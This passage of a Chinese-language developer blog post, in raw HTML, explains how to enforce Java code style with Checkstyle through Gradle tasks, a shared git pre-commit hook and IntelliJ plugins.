class=\"crayon-line\" id=\"crayon-594bcde4bfd1c383467139-17\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">throw</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GradleException</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"There were checkstyle warnings! For more info check $outputFile\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">             </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd1c383467139-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">         </span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd1c383467139-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd1c383467139-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd1c383467139-21\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0066 seconds] -->\r\n<p>现在只需要一条命令，每个开发者就能在本地验证Code Style了。你可以在<a href=\"https://docs.gradle.org/current/userguide/checkstyle_plugin.html\">这里</a>找到Gradle Checkstyle Plugin的详细配置文档，如果你使用Maven，则可以参考<a href=\"https://maven.apache.org/plugins/maven-checkstyle-plugin/\">这里</a>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bcde4bfd23521020073\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n➜  court-booking-backend (master) ✗ ./gradlew check \r\nStarting a Gradle Daemon (subsequent builds will be faster) \r\n:compileJava \r\n:processResources UP-TO-DATE \r\n:classes \r\n:checkstyleMain [ant:checkstyle] \r\n    [WARN] /Users/twer/Workspace/restbucks/court-booking-backend/src/main/java/com/restbucks/courtbooking/http/CourtRestController.java:16: \r\n    'method def' child have incorrect indentation level 4, expected level should be 8. [Indentation] :checkstyleMain FAILED  \r\nFAILURE: Build failed with an exception.</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd23521020073-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd23521020073-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd23521020073-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd23521020073-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd23521020073-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd23521020073-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd23521020073-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd23521020073-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd23521020073-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bcde4bfd23521020073-1\">➜<span class=\"crayon-h\">  </span><span class=\"crayon-v\">court</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">booking</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">backend</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">master</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span>✗<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">gradlew </span><span class=\"crayon-e\">check </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd23521020073-2\"><span class=\"crayon-i\">Starting</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Gradle </span><span class=\"crayon-e\">Daemon</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">subsequent </span><span class=\"crayon-e\">builds </span><span class=\"crayon-e\">will </span><span class=\"crayon-e\">be </span><span class=\"crayon-v\">faster</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd23521020073-3\"><span class=\"crayon-o\">:</span><span class=\"crayon-v\">compileJava</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd23521020073-4\"><span class=\"crayon-o\">:</span><span class=\"crayon-e\">processResources </span><span class=\"crayon-v\">UP</span><span class=\"crayon-o\">-</span><span class=\"crayon-st\">TO</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">DATE</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd23521020073-5\"><span class=\"crayon-o\">:</span><span class=\"crayon-v\">classes</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd23521020073-6\"><span class=\"crayon-o\">:</span><span class=\"crayon-i\">checkstyleMain</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">ant</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">checkstyle</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd23521020073-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">WARN</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Users</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">twer</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Workspace</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">restbucks</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">court</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">booking</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">backend</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">src</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">main</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">java</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">restbucks</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">courtbooking</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">CourtRestController</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">java</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd23521020073-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'method def'</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">have </span><span class=\"crayon-e\">incorrect </span><span class=\"crayon-e\">indentation </span><span class=\"crayon-i\">level</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">expected </span><span class=\"crayon-e\">level </span><span class=\"crayon-e\">should </span><span class=\"crayon-i\">be</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">Indentation</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">checkstyleMain </span><span class=\"crayon-e\">FAILED  </span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd23521020073-9\"><span class=\"crayon-v\">FAILURE</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Build </span><span class=\"crayon-e\">failed </span><span class=\"crayon-e\">with </span><span class=\"crayon-e\">an </span><span class=\"crayon-v\">exception</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0032 seconds] -->\r\n<p></p>\n<h3>本地验证很不错，但我有时候会忘记执行</h3>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/7-lifecycle-git-hook.jpg\"><img class=\"aligncenter\" src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/7-lifecycle-git-hook-1024x559.jpg\" alt=\"\" width=\"700\" height=\"382\"></a></p>\n<p style=\"text-align: center;\">（让机器代劳琐事）</p>\n<p>有时候，开发者修改了代码后会忘记执行本地检查就提交代码了，最好能够在提交代码前自动执行检查。如果你使用Git的话，可能会想到Git commit hook，比如这是我常用的pre-commit hook</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bcde4bfd2a407166679\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#!/bin/sh\r\n# From gist at https://gist.github.com/chadmaughan/5889802\r\n\r\n# stash any unstaged changes\r\ngit stash -q --keep-index\r\n\r\n# run the tests with the gradle wrapper\r\n./gradlew clean build\r\n\r\n# store the last exit code in a variable\r\nRESULT=$?\r\n\r\n# unstash the unstashed changes\r\ngit stash pop -q\r\n\r\n# return the './gradlew build' exit code\r\nexit $RESULT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2a407166679-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2a407166679-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2a407166679-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2a407166679-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2a407166679-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2a407166679-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2a407166679-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2a407166679-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2a407166679-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2a407166679-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2a407166679-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2a407166679-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2a407166679-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2a407166679-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2a407166679-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2a407166679-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2a407166679-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2a407166679-1\"><span class=\"crayon-p\">#!/bin/sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2a407166679-2\"><span class=\"crayon-p\"># From gist at https://gist.github.com/chadmaughan/5889802</span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2a407166679-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2a407166679-4\"><span class=\"crayon-p\"># stash any unstaged changes</span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2a407166679-5\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">stash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">q</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">keep</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">index</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2a407166679-6\"> </div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2a407166679-7\"><span class=\"crayon-p\"># run the tests with the gradle wrapper</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2a407166679-8\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">gradlew </span><span class=\"crayon-e\">clean </span><span class=\"crayon-v\">build</span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2a407166679-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2a407166679-10\"><span class=\"crayon-p\"># store the last exit code in a variable</span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2a407166679-11\"><span class=\"crayon-v\">RESULT</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">?</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2a407166679-12\"> </div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2a407166679-13\"><span class=\"crayon-p\"># unstash the unstashed changes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2a407166679-14\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">stash </span><span class=\"crayon-v\">pop</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">q</span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2a407166679-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2a407166679-16\"><span class=\"crayon-p\"># return the './gradlew build' exit code</span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2a407166679-17\"><span class=\"crayon-i\">exit</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">RESULT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>将该脚本拷贝到<code>.git/hooks/</code>下，在执行<code>git commit</code>的时候就会自动触发检查了，如果检查失败则提交失败。但问题是<code>.git</code>并不能提交到远程代码仓库，那么除了人工分发和拷贝外，有没有更好的方式在团队中共享这个机制呢？</p>\n<p>可以曲线救国！把pre-commit纳入版本控制(如下面的<code>config/pre-commit</code>)，再使用构建工具的扩展机制来自动完成拷贝工作，这样可以间接实现git hooks的团队间共享。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bcde4bfd2e088468891\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# build.gradle\r\n\r\ntask installGitHooks(type: Copy) { //将pre-commit拷贝到指定位置\r\n    from new File(rootProject.rootDir, 'config/pre-commit')\r\n    into {\r\n        new File(rootProject.rootDir, '.git/hooks')\r\n    }\r\n    fileMode 0755\r\n}\r\n\r\nbuild.dependsOn installGitHooks //设置执行build任务时会自动触发installGitHooks任务</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2e088468891-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2e088468891-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2e088468891-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2e088468891-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2e088468891-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2e088468891-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2e088468891-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2e088468891-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2e088468891-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd2e088468891-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd2e088468891-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2e088468891-1\"><span class=\"crayon-p\"># build.gradle</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2e088468891-2\"> </div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2e088468891-3\"><span class=\"crayon-e\">task </span><span class=\"crayon-e\">installGitHooks</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">type</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Copy</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//将pre-commit拷贝到指定位置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2e088468891-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">from </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">File</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rootProject</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rootDir</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'config/pre-commit'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2e088468891-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">into</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2e088468891-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">File</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rootProject</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rootDir</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'.git/hooks'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2e088468891-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2e088468891-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">fileMode</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0755</span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2e088468891-9\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd2e088468891-10\"> </div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd2e088468891-11\"><span class=\"crayon-v\">build</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">dependsOn </span><span class=\"crayon-v\">installGitHooks</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//设置执行build任务时会自动触发installGitHooks任务</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p></p>\n<h3>关闭包围圈，编辑时反馈</h3>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/8-lifecycle-edit-time.jpg\"><img class=\"aligncenter\" src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/8-lifecycle-edit-time-1024x558.jpg\" alt=\"\" width=\"700\" height=\"381\"></a></p>\n<p style=\"text-align: center;\">(实时反馈)</p>\n<p>之前基于构建工具的方案都很好，但是对于开发者来说，最好能将反馈前移到编辑时，并且可视化。所幸的是，Checkstyle的生态系统非常成熟，各主流IDE都有插件支持，以Intellij Idea为例，可以使用<a href=\"https://github.com/jshiell/checkstyle-idea\">checkstyle-idea</a>插件，让团队成员手工设置插件，使用项目的checkstyle配置文件即可(我目前还没有找到自动化配置的方式，或许gradle idea插件可以？)</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/9-idea-checkstyle-settings.jpg\"><img class=\"aligncenter\" src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/9-idea-checkstyle-settings-1024x258.jpg\" alt=\"\" width=\"700\" height=\"176\"></a></p>\n<p style=\"text-align: center;\"><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/10-idea-checkstyle-plugin.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/10-idea-checkstyle-plugin-1024x142.jpg\" alt=\"\" width=\"700\" height=\"97\"></a></p>\n<p style=\"text-align: center;\">(checkstyle-idea插件配置和效果)</p>\n<p>有了自动实时检查，最好还能将IDE的自动格式化与Checkstyle配置文件挂钩，否则自动格式化反倒给你添麻烦了。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/11-idea-format.jpg\"><img class=\"aligncenter\" src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/11-idea-format-1024x485.jpg\" alt=\"\" width=\"700\" height=\"332\"></a></p>\n<p style=\"text-align: center;\">(为IDE导入checkstyle配置文件作为自动格式化的依据)</p>\n<p>如果你连自动格式化都懒得按，那可以试试<a href=\"https://github.com/dubreuia/intellij-plugin-save-actions\">Save Actions</a>插件，它可以在Intellij保存文件时自动执行代码格式化等动作。</p>\n<p style=\"text-align: center;\"><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/12-save-actions.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/12-save-actions-1024x583.jpg\" alt=\"\" width=\"700\" height=\"399\"></a></p>\n<p style=\"text-align: center;\">(这个插件目前对部分文件有些问题，可以通过File path exclusion忽略)</p>\n<h3>总结</h3>\n<ol>\n<li>Code Style影响工作效率，团队应将其当做工程实践予以重视。</li>\n<li>Code Style不能靠人工监督和检查，应该提供端到端的工具支持\n<ul>\n<li>服务端检查（推荐集成到CI的构建步骤中）</li>\n<li>开发环境检查（使用各构建工具的Checkstyle插件）</li>\n<li>自动提交检查（git pre-commit hook与共享）</li>\n<li>IDE增强（checkstyle插件实时可视化反馈/自动的自动格式化！）</li>\n<li>以上的工具都要依据为同一份Checkstyle配置文件，并纳入版本控制</li>\n</ul>\n</li>\n</ol>\n<p>希望以上这些招数可以解救Java Code Style强迫症 ：）</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111468\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111468votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111468\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a 